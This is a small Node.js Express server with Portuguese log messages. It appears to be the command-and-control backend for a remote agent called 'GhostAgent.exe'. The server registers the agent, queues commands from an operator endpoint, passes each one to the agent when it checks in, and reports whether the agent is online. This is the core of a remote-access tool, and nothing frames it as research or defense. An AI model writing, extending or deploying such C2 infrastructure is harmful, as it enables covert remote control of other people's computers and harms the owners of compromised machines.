const express = require('express');
const path = require('path');

const app = express();
const port = process.env.PORT || 3000;

let agentOnline = false;
let lastAgentPing = Date.now();
let pendingCommand = null;

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

console.log('[*] Iniciando servidor...');

// Health check
app.get('/health', (req, res) => {
    res.send('OK');
});

// Agent register
app.post('/api/agent/register', (req, res) => {
    const { agent_id, status } = req.body || {};
    agentOnline = true;
    lastAgentPing = Date.now();
    console.log(`[+] Agente: ${agent_id}`);
    
    if (pendingCommand) {
        const cmd = pendingCommand;
        pendingCommand = null;
        res.json({ status: 'OK', command: cmd.command, commandId: cmd.id });
    } else {
        res.json({ status: 'OK' });
    }
});

// Agent result
app.post('/api/agent/result', (req, res) => {
    console.log(`[+] Resultado recebido`);
    res.json({ status: 'OK' });
});

// Send command
app.post('/api/command', (req, res) => {
    const { command } = req.body || {};
    if (!command) {
        return res.status(400).json({ status: 'ERROR', message: 'Comando não fornecido' });
    }
    if (!agentOnline) {
        return res.status(503).json({ status: 'ERROR', message: 'Agente offline - conecte o GhostAgent.exe' });
    }
    
    pendingCommand = { command, id: Date.now() };
    console.log(`[*] Comando: ${command}`);
    res.json({ status: 'OK', message: `Comando "${command}" enfileirado` });
});

// Status
app.get('/api/status', (req, res) => {
    res.json({
        server: 'online',
        agent: (Date.now() - lastAgentPing) > 10000 ? 'offline' : 'online'
    });
});

const server = app.listen(port, '0.0.0.0', () => {
    console.log(`[✓] Server online na porta ${port}`);
});

server.on('error', (err) => {
    console.error('[!] Erro no servidor:', err);
});
